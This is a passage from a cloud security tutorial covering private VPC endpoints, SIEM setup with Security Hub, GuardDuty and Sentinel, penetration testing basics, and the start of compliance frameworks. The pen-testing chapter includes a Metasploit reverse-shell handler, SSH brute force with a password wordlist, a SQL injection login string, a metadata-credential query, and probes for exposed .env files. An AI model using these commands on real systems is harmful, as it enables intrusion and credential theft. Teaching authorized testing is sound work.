  # 1. Local VPC traffic (automatic)
  # 2. VPC endpoints (automatic via endpoint route tables)
  # 3. VPN connection to on-premises (optional)

  # NO: route to 0.0.0.0/0 via NAT gateway
  # NO: route to 0.0.0.0/0 via internet gateway

  tags = {
    Name = "truly-private-rt"
  }
}
```

**Services needed for a fully private Kubernetes cluster on EKS:**

```bash
# List of required VPC endpoints for fully private EKS
aws ec2 describe-vpc-endpoint-services \
  --query 'ServiceNames[?contains(@, `amazonaws`)]' \
  --output text | tr '\t' '\n' | grep "us-east-1\." | sort

# Minimum required for private EKS:
# - com.amazonaws.REGION.ec2
# - com.amazonaws.REGION.ecr.api
# - com.amazonaws.REGION.ecr.dkr
# - com.amazonaws.REGION.s3 (Gateway)
# - com.amazonaws.REGION.logs
# - com.amazonaws.REGION.sts
# - com.amazonaws.REGION.elasticloadbalancing
```

### Common Mistakes Beginners Make

**Mistake 1: Assuming VPC means private**

By default, resources in a VPC can still access the internet through a NAT gateway, and can be accessed from the internet if they have a public IP. A VPC is a network boundary, not a privacy guarantee.

**Mistake 2: Forgetting the S3 endpoint**

EC2 instances connecting to S3 without a VPC endpoint route traffic over the public internet, even though both are in AWS. This means traffic counts against your internet bandwidth and bypasses your private networking design.

**Mistake 3: Not testing that internet access is actually blocked**

After setting up private networking, verify that your instances cannot reach the internet:

```bash
# SSH into a private instance via Systems Manager Session Manager
aws ssm start-session --target i-1234567890abcdef0

# Try to reach the internet (should fail/timeout)
curl -m 5 https://google.com
# Expected: curl: (28) Operation timed out
# If this succeeds, your routing still allows internet access
```

**Mistake 4: Using public AMIs that require internet for package updates**

A fully private instance can't reach package repositories. Use AWS Systems Manager Patch Manager with a private endpoint, or pre-bake your AMIs with all required packages.

### How This Works in the Real World

Financial institutions commonly operate "air-gapped" environments where application workloads have zero internet access. All AWS service calls use VPC endpoints; all inter-service communication stays within VPCs or private transit gateways. Even developer access uses AWS Systems Manager Session Manager (no SSH over the internet, no bastion hosts with public IPs).

### Practical Task — Chapter 6

**Task:** Set up private endpoints for all AWS services used by your app — no public internet traffic.

**Step 1: Audit current internet traffic from private instances**

```bash
# Enable VPC Flow Logs to see where traffic is going
aws ec2 create-flow-logs \
  --resource-type VPC \
  --resource-ids vpc-YOURPVCID \
  --traffic-type ALL \
  --log-destination-type cloud-watch-logs \
  --log-group-name /aws/vpc/flowlogs \
  --deliver-logs-permission-arn arn:aws:iam::ACCOUNT:role/flowlogsRole

# After 30 minutes, analyze traffic destined for non-RFC1918 addresses
# (public internet) from your private instances
# RFC1918 ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
aws logs filter-log-events \
  --log-group-name /aws/vpc/flowlogs \
  --filter-pattern '{ ($.dstAddr NOT STARTS WITH "10.") && ($.dstAddr NOT STARTS WITH "172.16.") && ($.dstAddr NOT STARTS WITH "192.168.") && $.action = "ACCEPT" }'
```

**Step 2: Create required VPC endpoints (use Terraform from above)**

**Step 3: Update your application's security groups**

```bash
# Remove outbound internet access from application security groups
aws ec2 revoke-security-group-egress \
  --group-id sg-YOURSGID \
  --protocol -1 \
  --cidr 0.0.0.0/0

# Add only required outbound access (to VPC endpoints)
aws ec2 authorize-security-group-egress \
  --group-id sg-YOURSGID \
  --protocol tcp \
  --port 443 \
  --destination-group sg-VPCENDPOINT_SG_ID
```

**Step 4: Verify all traffic stays private**

```bash
# Deploy a test instance in the private subnet
# Try to reach internet — should fail
# Try to reach S3 via endpoint — should succeed
aws s3 ls s3://your-bucket --debug 2>&1 | grep "endpoint"
# Should show endpoint URL, not public S3 URL
```

### Chapter 6 Summary

- **Private networking** keeps sensitive traffic off the public internet
- **VPN** encrypts tunnels between networks over the public internet
- **AWS PrivateLink** and **VPC Endpoints** route AWS service traffic over AWS's private network
- **Gateway endpoints** (S3, DynamoDB) are free and use route tables
- **Interface endpoints** use private IPs in your VPC and require security groups
- **Private DNS** (Route 53 private hosted zones) keeps service discovery internal
- A truly private architecture removes NAT gateways and blocks all outbound internet access
- Always **verify** your private networking with flow log analysis and direct internet tests

---

## Chapter 7 — SIEM Basics {#chapter-7}

### What is a SIEM and Why Do You Need One?

Imagine you manage a large office building with security cameras in every room, badge readers on every door, and motion sensors in every corridor. Now imagine that all the footage goes to separate monitors in separate rooms, and nobody's job is to watch them all at once.

A **SIEM (Security Information and Event Management)** system is the unified security monitoring center that collects all those feeds, correlates them, and alerts you when something looks wrong — before you have to manually review thousands of logs.

In the digital world, your "cameras and sensors" are:
- Application logs
- AWS CloudTrail (API activity)
- VPC Flow Logs (network traffic)
- Load balancer access logs
- Kubernetes audit logs
- OS syslogs

A SIEM ingests all of these, normalizes the data into a common format, and applies **correlation rules** to detect patterns that suggest an attack.

### Log Correlation: Finding Patterns Across Events

Individual log entries often look innocent. It's the pattern that reveals the threat.

**Example:** A single failed login is normal. But 500 failed logins across 200 different usernames from one IP address in 60 seconds is a credential stuffing attack.

No single log line would trigger an alert. The correlation of many events across time reveals the attack.

```
09:00:01  FAILED  login  username=alice    ip=192.168.1.1
09:00:01  FAILED  login  username=bob      ip=192.168.1.1
09:00:02  FAILED  login  username=charlie  ip=192.168.1.1
...
09:01:00  FAILED  login  username=zara     ip=192.168.1.1

→ Correlation rule: >100 failed logins from one IP in 60 seconds
→ Alert: Credential stuffing attack detected from 192.168.1.1
→ Action: Block IP in WAF, notify security team
```

### AWS Security Hub: Centralized Security Findings

**AWS Security Hub** aggregates security findings from multiple AWS services and third-party tools into a single dashboard. It continuously checks your AWS environment against security standards.

Supported standards:
- **AWS Foundational Security Best Practices** (FSBP)
- **CIS AWS Foundations Benchmark**
- **PCI DSS**
- **NIST 800-53**

```bash
# Enable Security Hub
aws securityhub enable-security-hub \
  --enable-default-standards   # Automatically enables FSBP and CIS

# Subscribe to all available standards
aws securityhub batch-enable-standards \
  --standards-subscription-requests \
    StandardsArn="arn:aws:securityhub:::ruleset/finding-format/aws-foundational-security-best-practices/v/1.0.0" \
    StandardsArn="arn:aws:securityhub:::ruleset/cis-aws-foundations-benchmark/v/1.2.0" \
    StandardsArn="arn:aws:securityhub:::ruleset/pci-dss/v/3.2.1"

# View your security score
aws securityhub get-insights \
  --insight-arns "arn:aws:securityhub:::insight/securityhub/default/1"

# List critical findings
aws securityhub get-findings \
  --filters '{"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"}]}' \
  --sort-criteria '[{"Field":"SeverityLabel","SortOrder":"desc"}]' \
  --max-results 20
```

**Enable key integrations:**

```bash
# Enable GuardDuty integration (threat detection)
aws guardduty create-detector --enable

# Enable Inspector v2 (vulnerability scanning)
aws inspector2 enable --resource-types EC2 ECR LAMBDA

# Enable Config (resource configuration tracking)
aws configservice put-configuration-recorder \
  --configuration-recorder name=default,roleARN=arn:aws:iam::ACCOUNT:role/config-role

# Enable CloudTrail (API activity logging)
aws cloudtrail create-trail \
  --name production-trail \
  --s3-bucket-name your-cloudtrail-bucket \
  --is-multi-region-trail \
  --enable-log-file-validation
```

### Microsoft Sentinel: Cloud-Native SIEM for Azure (and Multi-Cloud)

**Microsoft Sentinel** is a fully managed SIEM + SOAR (Security Orchestration, Automation, and Response) platform. Unlike traditional SIEMs (which require on-premises infrastructure), Sentinel is serverless and scales automatically.

**Key concepts:**

- **Workspace:** Your Sentinel instance, backed by a Log Analytics workspace
- **Data Connectors:** Integrations that bring data in (Azure, AWS, on-premises, SaaS)
- **Analytics Rules:** Correlation logic that detects threats
- **Incidents:** Grouped alerts that represent a potential attack
- **Workbooks:** Dashboards for visualizing security data
- **Playbooks:** Automated response workflows (Logic Apps)

**Setting up Sentinel and connecting AWS:**

```bash
# Create a Log Analytics workspace (Sentinel runs on top of this)
az monitor log-analytics workspace create \
  --resource-group security-rg \
  --workspace-name production-siem \
  --location eastus \
  --sku PerGB2018

# Enable Sentinel on the workspace
az sentinel workspace create \
  --resource-group security-rg \
  --workspace-name production-siem

# Connect AWS CloudTrail to Sentinel
# (Done via the Sentinel Data Connectors UI or ARM template)
# This creates an SQS queue in AWS that Sentinel polls
```

**Creating a detection rule in Sentinel (KQL query):**

```kql
// Kusto Query Language (KQL): Sentinel's query language
// This rule detects brute force attempts against AWS console logins

AWSCloudTrail
// Filter to ConsoleLogin events that failed
| where EventName == "ConsoleLogin"
| where ErrorMessage == "Failed authentication"
// Group by user and time window
| summarize 
    FailedAttempts = count(),
    UniqueIPs = dcount(SourceIpAddress)
  by UserIdentityUserName, bin(TimeGenerated, 10m)
// Alert when a user has >10 failed attempts in 10 minutes
| where FailedAttempts > 10
| project 
    TimeGenerated,
    UserIdentityUserName,
    FailedAttempts,
    UniqueIPs,
    AlertSeverity = "High"
```

### AWS GuardDuty: Intelligent Threat Detection

**GuardDuty** uses machine learning and threat intelligence to analyze CloudTrail, VPC Flow Logs, and DNS logs to detect threats automatically. It's not a SIEM but integrates with Security Hub to feed findings into your SIEM.

**GuardDuty finding types (examples):**

| Finding | Meaning |
|---------|---------|
| `UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B` | Console login from unusual location |
| `CryptoCurrency:EC2/BitcoinTool.B` | EC2 instance communicating with cryptocurrency mining pool |
| `Trojan:EC2/BlackholeTraffic` | EC2 communicating with IP known to be a command-and-control server |
| `UnauthorizedAccess:EC2/SSHBruteForce` | EC2 being targeted by SSH brute force |
| `PrivilegeEscalation:IAMUser/AdministrativePermissions` | IAM user attempting to grant themselves admin permissions |

```bash
# Enable GuardDuty
aws guardduty create-detector \
  --enable \
  --finding-publishing-frequency FIFTEEN_MINUTES  # How often findings are published

# List findings
aws guardduty list-findings \
  --detector-id YOUR_DETECTOR_ID \
  --finding-criteria '{"Criterion": {"severity": {"Gte": 7}}}'  
  # Gte 7 = high severity (7-10)

# Get finding details
aws guardduty get-findings \
  --detector-id YOUR_DETECTOR_ID \
  --finding-ids FINDING_ID_1 FINDING_ID_2
```

### Building a Security Dashboard

A useful SIEM dashboard shows:
- Security posture score (% of controls passing)
- Critical findings by service
- Failed login attempts over time
- API calls from unusual locations
- Resources with public exposure

```python
# Python script to generate a security posture summary from Security Hub
import boto3
import json
from datetime import datetime, timedelta

sh = boto3.client('securityhub')
cw = boto3.client('cloudwatch')

# Get security standards compliance summary
def get_security_score():
    response = sh.get_insights(
        InsightArns=['arn:aws:securityhub:::insight/securityhub/default/32']
    )
    return response['Insights']

# Get findings by severity in the last 24 hours
def get_findings_summary():
    yesterday = (datetime.utcnow() - timedelta(days=1)).strftime('%Y-%m-%dT%H:%M:%SZ')
    
    severities = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']
    summary = {}
    
    for severity in severities:
        findings = sh.get_findings(
            Filters={
                'SeverityLabel': [{'Value': severity, 'Comparison': 'EQUALS'}],
                'CreatedAt': [{'Start': yesterday, 'End': datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')}],
                'WorkflowStatus': [{'Value': 'NEW', 'Comparison': 'EQUALS'}]
            },
            MaxResults=1
        )
        # The total count is in the filter response
        summary[severity] = len(findings['Findings'])
    
    return summary

print("Security Findings Summary (last 24h):")
print(json.dumps(get_findings_summary(), indent=2))
```

### Common Mistakes Beginners Make

**Mistake 1: Collecting logs but not reviewing them**

A SIEM that ingests everything but has no alerting rules and nobody reviewing the dashboards provides false security. Invest in tuning your detection rules.

**Mistake 2: Too many low-quality alerts (alert fatigue)**

If your SIEM sends 100 alerts per day, on-call engineers will start ignoring them. Tune your rules ruthlessly. Each alert should be high-signal, actionable, and rare.

**Mistake 3: Not testing your detection rules**

Regularly simulate the attack patterns your rules should detect. If a rule for "impossible travel" (user logged in from NYC and London within 5 minutes) never triggers during a test, it won't trigger during a real attack.

**Mistake 4: Only logging infrastructure, not applications**

Application logs often reveal business-logic attacks — bulk data exports, abnormal payment patterns, account enumeration — that infrastructure logs don't capture.

### How This Works in the Real World

Financial institutions operate 24/7 Security Operations Centers (SOCs) that monitor SIEM dashboards and respond to alerts. A typical setup:

- All logs forwarded to a central SIEM (Splunk, Sentinel, Elastic Security)
- Machine learning models flag anomalies (unusual login times, unexpected data access volumes)
- Low-severity alerts go to a ticket queue; high-severity alerts page the on-call analyst
- Automated playbooks handle common responses (blocking an IP, disabling a compromised account)

### Practical Task — Chapter 7

**Task:** Set up AWS Security Hub with all standards — build a dashboard showing security posture score.

```bash
# Step 1: Enable Security Hub with all standards
aws securityhub enable-security-hub --enable-default-standards

# Enable additional standards
ACCOUNT=$(aws sts get-caller-identity --query Account --output text)
REGION=$(aws configure get region)

aws securityhub batch-enable-standards \
  --standards-subscription-requests \
    "StandardsArn=arn:aws:securityhub:${REGION}::standards/pci-dss/v/3.2.1" \
    "StandardsArn=arn:aws:securityhub:${REGION}::standards/aws-foundational-security-best-practices/v/1.0.0" \
    "StandardsArn=arn:aws:securityhub:${REGION}::standards/cis-aws-foundations-benchmark/v/1.2.0"

# Step 2: Enable key integrations
# Enable GuardDuty
DETECTOR_ID=$(aws guardduty create-detector --enable --query DetectorId --output text)
echo "GuardDuty Detector ID: $DETECTOR_ID"

# Enable Inspector
aws inspector2 enable \
  --resource-types EC2 ECR LAMBDA

# Step 3: Create a CloudWatch Dashboard for security posture
aws cloudwatch put-dashboard \
  --dashboard-name SecurityPosture \
  --dashboard-body '{
    "widgets": [
      {
        "type": "metric",
        "properties": {
          "title": "Security Hub - Failed Controls",
          "metrics": [
            ["AWS/SecurityHub", "SecurityScore"]
          ],
          "period": 300,
          "stat": "Average",
          "view": "gauge",
          "yAxis": {"left": {"min": 0, "max": 100}}
        }
      },
      {
        "type": "metric",
        "properties": {
          "title": "GuardDuty Findings",
          "metrics": [
            ["AWS/GuardDuty", "FindingCount", "DetectorId", "'$DETECTOR_ID'", "Severity", "High"],
            ["AWS/GuardDuty", "FindingCount", "DetectorId", "'$DETECTOR_ID'", "Severity", "Medium"]
          ],
          "period": 3600,
          "stat": "Sum"
        }
      }
    ]
  }'

# Step 4: Verify findings are flowing
aws securityhub get-findings \
  --filters '{"RecordState":[{"Value":"ACTIVE","Comparison":"EQUALS"}]}' \
  --max-results 5
```

### Chapter 7 Summary

- A **SIEM** centralizes security event data and correlates it to detect threats
- **Log correlation** finds patterns across multiple events that no single event reveals
- **AWS Security Hub** aggregates findings from GuardDuty, Inspector, Config, and third parties
- **Security posture score** measures your compliance against standards like CIS and FSBP
- **GuardDuty** provides ML-based threat detection from CloudTrail, Flow Logs, and DNS
- **Microsoft Sentinel** is a cloud-native SIEM that supports multi-cloud environments
- **KQL (Kusto Query Language)** is Sentinel's query language for writing detection rules
- Alert quality matters more than quantity — avoid alert fatigue through careful rule tuning

---

## Chapter 8 — Penetration Testing Basics {#chapter-8}

### Thinking Like an Attacker

In every previous chapter, we've been defenders. We build walls, we set rules, we monitor. This chapter flips the perspective: to defend effectively, you need to understand how attackers think.

A **penetration test** (pen test) is an authorized simulation of an attack on your own systems. You — or a hired security professional — try to find vulnerabilities the way a real attacker would. The difference between a pen test and an actual attack is two things: permission and intent.

A pen test answers the question: *What would happen if someone tried to break in?*

### The Penetration Testing Methodology

Professional penetration testers follow a structured methodology. The most widely used is the **OWASP Testing Methodology** and the **PTES (Penetration Testing Execution Standard)**.

**Phase 1: Pre-Engagement (Scope Definition)**

Before touching anything, define:
- **Scope:** What systems are in scope? What's explicitly out of scope?
- **Rules of engagement:** Can you use social engineering? Are DoS attacks allowed?
- **Timeline:** When will testing occur? Are there blackout windows?
- **Contact information:** Who do you call if you accidentally take something down?
- **Authorization document:** Written permission from an authorized representative

**Without proper authorization, penetration testing is illegal.** Even testing your own company's systems requires documented authorization from the system owner.

**Phase 2: Reconnaissance (Information Gathering)**

Gather information about the target without directly attacking it.

**Passive reconnaissance (no contact with target):**

```bash
# DNS enumeration — find subdomains and records
# These are all publicly available queries
dig yourdomain.com ANY          # All DNS records
dig yourdomain.com MX           # Mail servers
dig yourdomain.com TXT          # SPF, DMARC, verification records

# Subdomain enumeration using passive sources
# subfinder is a popular OSINT tool
subfinder -d yourdomain.com -o subdomains.txt

# Check for information in certificate transparency logs
curl "https://crt.sh/?q=%.yourdomain.com&output=json" | jq '.[].name_value' | sort -u

# Check what technology the web app uses
whatweb https://yourdomain.com

# Look up WHOIS information
whois yourdomain.com
```

**Active reconnaissance (direct contact with target, within scope):**

```bash
# Port scanning with nmap
# nmap is the industry-standard network scanner
# -sV: detect service versions
# -sC: run default scripts
# -O: OS detection
# -p-: scan all 65535 ports (slower but thorough)
nmap -sV -sC -O -p- 10.0.1.5

# Example output:
# PORT     STATE SERVICE VERSION
# 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
# 80/tcp   open  http    nginx 1.18.0
# 443/tcp  open  https   nginx 1.18.0
# 5432/tcp open  postgresql PostgreSQL DB 12.x
# ← Wait, why is PostgreSQL exposed on the network?!
```

**Phase 3: Vulnerability Scanning**

Automated tools identify known vulnerabilities:

```bash
# Web application vulnerability scanning
# nikto scans for common web server misconfigurations and vulnerabilities
nikto -h https://yourdomain.com -output nikto-results.txt

# More comprehensive: OWASP ZAP
# Run in Docker for easy setup
docker run -v $(pwd):/zap/wrk/:rw \
  -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t https://yourdomain.com -r zap-report.html

# Infrastructure vulnerability scanning with OpenVAS
# (requires setup, but provides CVE-mapped findings)
```

**Phase 4: Exploitation**

Attempt to exploit found vulnerabilities. This is where **Metasploit** comes in.

**Metasploit Framework:**

Metasploit is an open-source penetration testing framework that contains hundreds of modules for exploiting known vulnerabilities, generating payloads, and maintaining access.

```bash
# Start Metasploit console
msfconsole

# Search for relevant exploits
msf > search eternalblue      # Search for MS17-010 exploits
msf > search type:exploit platform:linux

# Use a specific module
msf > use exploit/multi/handler
msf > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf > set LHOST 10.0.0.1     # Your attack machine IP
msf > set LPORT 4444
msf > run

# More targeted: auxiliary scanning modules
msf > use auxiliary/scanner/ssh/ssh_login
msf > set RHOSTS 10.0.1.0/24
msf > set USERNAME root
msf > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf > run
```

**Important context:** You should only run Metasploit against systems you own or have explicit written permission to test. Even then, exploitation modules can crash services. Test during maintenance windows.

**Phase 5: Post-Exploitation and Lateral Movement**

Once in, how far can an attacker get?

```bash
# From a compromised machine, what can you see?
# Internal network enumeration
# Can you reach the database from here?
nmap -sn 10.0.0.0/8         # Ping sweep of internal network
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# ↑ This checks if the EC2 instance has an IAM role with credentials
# A compromised EC2 with a permissive IAM role is catastrophic
```

**Phase 6: Reporting**

The most important deliverable. A pen test report must include:

```markdown
# Penetration Test Report

## Executive Summary
High-level summary for management: what was tested, what was found,
what risk it represents.

## Technical Findings

### Finding 1: PostgreSQL Exposed on Internal Network
**Severity:** High
**CVSS Score:** 7.5
**Affected System:** 10.0.1.5:5432
**Description:** PostgreSQL database is accessible from within the
internal network without firewall restriction. Any compromised host
on the network can attempt database authentication.
**Evidence:** [screenshot of nmap output]
**Remediation:** Restrict PostgreSQL access with Security Group rules.
Only allow connections from application server IP range on port 5432.
**References:** CIS AWS Foundations Benchmark 4.4

### Finding 2: ...
```

### OWASP Testing Methodology for Web Apps

The OWASP Testing Guide provides a comprehensive checklist for web application testing:

```bash
# Test for SQL injection
# Use sqlmap (automated SQL injection detection and exploitation)
sqlmap -u "https://yourdomain.com/api/users?id=1" \
  --level=5 \       # Testing level (1-5, higher is more thorough)
  --risk=2 \        # Risk level (1-3, higher uses more dangerous tests)
  --dbs             # List databases if injection is found

# Test for XSS
# Use Burp Suite Community Edition (free) for manual testing
# Or automated scanning with OWASP ZAP

# Test for authentication weaknesses
# Check for default credentials on admin panels
curl https://yourdomain.com/admin
# Look for /wp-admin, /phpmyadmin, /adminer, /.env

# Test for information disclosure
curl https://yourdomain.com/robots.txt      # Often reveals hidden paths
curl https://yourdomain.com/.git/HEAD      # Exposed git repository!
curl https://yourdomain.com/.env           # Exposed environment variables!
curl https://yourdomain.com/api/swagger    # API documentation
```

### Common Mistakes Beginners Make

**Mistake 1: Testing without written authorization**

Even if you work at the company and it's "your" systems, testing without explicit authorization from the system owner can result in termination and legal liability. Always get it in writing.

**Mistake 2: Forgetting to test production-like environments**

Testing a development environment with different configurations tells you little about production security. Test staging environments that mirror production.

**Mistake 3: Only doing automated scanning**

Automated scanners miss business logic vulnerabilities — things like "can I access another user's order by changing the order ID in the URL?" These require manual testing.

**Mistake 4: Poor reporting**

A pen test without a clear, actionable report has no value. Each finding must have: description, severity, evidence, reproduction steps, and remediation guidance.

### How This Works in the Real World

Most enterprises conduct pen tests annually at minimum, with larger companies testing quarterly or even continuously (bug bounty programs). SOC 2 and PCI DSS compliance require regular penetration testing.

A typical engagement:
- External pen tester (independent firm) hired for objectivity
- Kick-off meeting to define scope and rules of engagement
- 2-week testing period for a medium-sized application
- Draft report delivered, findings discussed
- Remediation period
- Re-test to verify critical findings are fixed
- Final report issued

### Practical Task — Chapter 8

**Task:** Conduct a basic penetration test of your own app using OWASP testing methodology.

**Setup: Deploy a deliberately vulnerable test application**

```bash
# IMPORTANT: NEVER run this on production
# Deploy OWASP WebGoat — a deliberately insecure application for training

docker run -it -p 8080:8080 -p 9090:9090 \
  -e TZ=Europe/Amsterdam \
  webgoat/goat-and-wolf:latest

# Access at http://localhost:8080/WebGoat
# Register and start testing
```

**Phase 1: Reconnaissance**

```bash
# Map the application structure
wget --spider -r -nd -nv \
  --reject gif,jpg,jpeg,png,css \
  http://localhost:8080/WebGoat 2>&1 | grep "200\|302\|403\|404"

# Directory enumeration
gobuster dir \
  -u http://localhost:8080/WebGoat \
  -w /usr/share/wordlists/dirb/common.txt \
  -o gobuster-results.txt
```

**Phase 2: Automated scanning**

```bash
# Run OWASP ZAP against the test app
docker run -v $(pwd):/zap/wrk/:rw \
  -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t http://host.docker.internal:8080/WebGoat -r zap-report.html

# View the HTML report
open zap-report.html
```

**Phase 3: Manual SQL injection testing**

```bash
# Test login form for SQL injection
curl -X POST http://localhost:8080/WebGoat/login \
  -d "username=admin' OR '1'='1' --&password=anything"

# Use sqlmap for automated detection
sqlmap -u "http://localhost:8080/WebGoat/SqlInjection/attack5a" \
  --data="account=1&operator=AND" \
  --cookie="JSESSIONID=YOUR_SESSION_COOKIE" \
  --level=2 --risk=1
```

**Phase 4: Document findings**

Create a findings report documenting each vulnerability discovered, its severity, evidence, and remediation steps.

### Chapter 8 Summary

- **Penetration testing** is authorized attack simulation to find vulnerabilities before real attackers do
- **Always get written authorization** — without it, pen testing is illegal
- **Methodology phases:** Pre-engagement, Reconnaissance, Vulnerability Scanning, Exploitation, Post-Exploitation, Reporting
- **nmap** is the standard port and service scanner
- **Metasploit** is the standard exploitation framework
- **OWASP ZAP** and **nikto** are standard web application scanners
- **Reports** are the deliverable — every finding needs evidence, severity, and remediation guidance
- Test **business logic** manually — automated scanners miss these vulnerabilities

---

## Chapter 9 — Compliance Frameworks {#chapter-9}

### Why Compliance Isn't Just a Box-Ticking Exercise

Many engineers groan when "compliance" comes up. It sounds like bureaucracy — forms, audits, checklists that exist to satisfy lawyers, not improve security.

But compliance frameworks represent decades of collective learning about what security controls actually work. **SOC 2, PCI DSS, HIPAA, ISO 27001, and GDPR** encode the minimum baseline of security practices that protect real people from real harm.

More practically: if you want to sell software to enterprises, healthcare providers, financial institutions, or government agencies, compliance is not optional. It's the price of admission.

### SOC 2: Trust Services Criteria

**What it is:** An auditing standard for service organizations (SaaS companies, cloud providers, etc.) that demonstrates their controls protect customer data.

**Who needs it:** Any SaaS company that wants to sell to enterprises, especially in the US.

**The Trust Services Criteria:**
- **Security (CC):** Logical and physical access controls, system monitoring, incident response
- **Availability (A):** Systems are available for operation as agreed
- **Processing Integrity (PI):** Systems process completely, accurately, timely
- **Confidentiality (C):** Information designated as confidential is protected
- **Privacy (P):** Personal information is collected, used, retained, disclosed correctly

**Type 1 vs Type 2:**
- **SOC 2 Type 1:** Auditor confirms your controls are designed correctly (point in time)
- **SOC 2 Type 2:** Auditor confirms your controls operated effectively over a period (typically 6-12 months)

**Technical controls required for SOC 2 Security (CC) criteria:**

| Control Domain | Technical Implementation |
|---|---|
| Logical access control (CC6) | MFA, RBAC, password policy |
| Network security (CC6.6) | Firewall rules, WAF, IDS |
| Vulnerability management (CC7.1) | Automated scanning, patch management |
| Monitoring and logging (CC7.2) | CloudTrail, SIEM, alerting |
| Incident response (CC7.3) | Incident response plan, runbooks |
| Change management (CC8.1) | Code reviews, CI/CD gates, approval workflows |

### PCI DSS: Payment Card Industry Data Security Standard

**What it is:** Required for any organization that stores, processes, or transmits credit card data.

**Merchant levels:** Based on transaction volume; higher levels require more stringent controls.

**The 12 PCI DSS requirements:**

```
1.  Install and maintain network security controls (firewalls)
2.  Apply secure configurations to all system components
3.  Protect stored account data (encryption, key management)
4.  Protect cardholder data with strong cryptography during transmission
5.  Protect all systems against malware
6.  Develop and maintain secure systems (vulnerability management)
7.  Restrict access to system components based on business need (least privilege)
8.  Identify users and authenticate access to system components (MFA)
9.  Restrict physical access to cardholder data
10. Log and monitor all access to system components and cardholder data
11. Test security of systems and networks regularly (pen testing)
12. Support information security with organizational policies
```

**AWS-specific PCI DSS controls:**

```hcl
# Requirement 1: Network security controls
# Ensure cardholder data environment (CDE) is isolated in its own VPC
resource "aws_vpc" "cde" {
  cidr_block = "10.1.0.0/16"
  tags = { Name = "cardholder-data-env", Compliance = "PCI-DSS" }
}

# Requirement 3: Encrypt stored card data
resource "aws_kms_key" "pci" {
  description             = "PCI DSS encryption key for cardholder data"
  deletion_window_in_days = 30   # PCI requires 30-day deletion window
  enable_key_rotation     = true # PCI requires annual key rotation
  
  policy = jsonencode({
    Version = "2012-10-17",
    Statement = [
      {
        Sid    = "EnableRootAccess",
        Effect = "Allow",
        Principal = { AWS = "arn:aws:iam::ACCOUNT:root" },
        Action    = "kms:*",
        Resource  = "*"
      },
      {
        Sid    = "AllowPCIApplicationAccess",
        Effect = "Allow",
        Principal = { AWS = "arn:aws:iam::ACCOUNT:role/pci-application-role" },
        Action    = ["kms:GenerateDataKey", "kms:Decrypt"],
        Resource  = "*"
      }
    ]
  })
}

# Requirement 10: Log all access to cardholder data
resource "aws_cloudtrail" "pci" {
  name           = "pci-audit-trail"
  s3_bucket_name = aws_s3_bucket.pci_logs.bucket
  
  event_selector {
    read_write_type           = "All"   # Log all read AND write API calls
    include_management_events = true
    
    data_resource {
      type   = "AWS::S3::Object"
      values = ["arn:aws:s3:::${aws_s3_bucket.cardholder_data.bucket}/"]
    }
  }
  
  insight_selector {
    insight_type = "ApiCallRateInsight"   # Detect unusual API call rates
  }
}
```

### HIPAA: Health Insurance Portability and Accountability Act

**What it is:** US federal law protecting health information (PHI — Protected Health Information).

**Who it applies to:** Healthcare providers, health plans, healthcare clearinghouses, and their business associates (that's you, if you build software for healthcare).

**Technical Safeguards (§164.312):**

```
Access Control: Unique user identification, emergency access procedures
Audit Controls: Hardware/software activity tracking
Integrity: PHI must not be improperly altered or destroyed
Person Authentication: Verify identity before accessing PHI
Transmission Security: Encrypt PHI in transit (TLS 1.2+)
```

**HIPAA on AWS:**
AWS is a HIPAA Business Associate. You must sign a **Business Associate Agreement (BAA)** with AWS before storing PHI in their services. Not all AWS services are HIPAA-eligible:

```bash
# HIPAA-eligible AWS services (partial list)
# Full list: https://aws.amazon.com/compliance/hipaa-eligible-services-reference/

✅ EC2 (with proper controls)
✅ RDS (encrypted)
✅ S3 (with encryption and access logging)
✅ KMS (for key management)
✅ CloudTrail
✅ Lambda
✅ EKS

❌ Amazon Rekognition (not eligible)
❌ Amazon Polly (not eligible)
# Always verify current eligibility before using for PHI
```

### GDPR: General Data Protection Regulation

**What it is:** EU regulation on personal data privacy rights. Applies to any organization processing EU residents' data, regardless of where the organization is based.

**Key principles:**
- **Lawfulness:** You must have a legal basis for processing personal data
- **Purpose limitation:** Collect data only for specified, explicit purposes
- **Data minimization:** Collect only what's necessary
- **Accuracy:** Keep data accurate and up to date
- **Storage limitation:** Don't keep data longer than necessary
- **Integrity and confidentiality:** Process data securely

**Technical requirements:**
- **Encryption** of personal data at rest and in transit
- **Data Subject Rights:** Ability to export, delete, or provide access to individual's data
- **Breach notification:** Report data breaches within 72 hours
- **Data Protection Impact Assessment (DPIA):** For high-risk processing

**Implementing the right to erasure (GDPR Article 17):**

```python
# User data deletion service
# Must delete personal data from ALL stores when requested
import boto3
import json

def delete_user_data(user_id: str):
    """
    Implements GDPR Article 17: Right to Erasure
    Deletes user data from all systems.
    """
    deletion_log = []
    
    # Delete from primary database
    rds = boto3.client('rds-data')
    rds.execute_statement(
        resourceArn='arn:aws:rds:REGION:ACCOUNT:cluster:production',
        secretArn='arn:aws:secretsmanager:REGION:ACCOUNT:secret:db-credentials',
        sql=f"DELETE FROM users WHERE id = :user_id",
        parameters=[{'name': 'user_id', 'value': {'stringValue': user_id}}]
    )
    deletion_log.append({"system": "primary_database", "status": "deleted"})
    
    # Delete from S3 user data bucket
    s3 = boto3.client('s3')
    paginator = s3.get_paginator('list_objects_v2')
    for page in paginator.paginate(Bucket='user-data-bucket', Prefix=f'users/{user_id}/'):
        for obj in page.get('Contents', []):
            s3.delete_object(Bucket='user-data-bucket', Key=obj['Key'])
    deletion_log.append({"system": "s3_user_data", "status": "deleted"})
    
    # Delete from analytics store (or anonymize if deletion impacts analytics integrity)
    # Anonymization: replace PII with pseudonymous data
    # analytics_db.execute("UPDATE events SET user_id = 'DELETED', email = NULL WHERE user_id = ?", user_id)
    
    # Log the deletion for compliance evidence
    # IMPORTANT: you must keep a record that deletion occurred
    # but you cannot keep the personal data itself
    audit_log = {
        "event": "user_data_deletion",
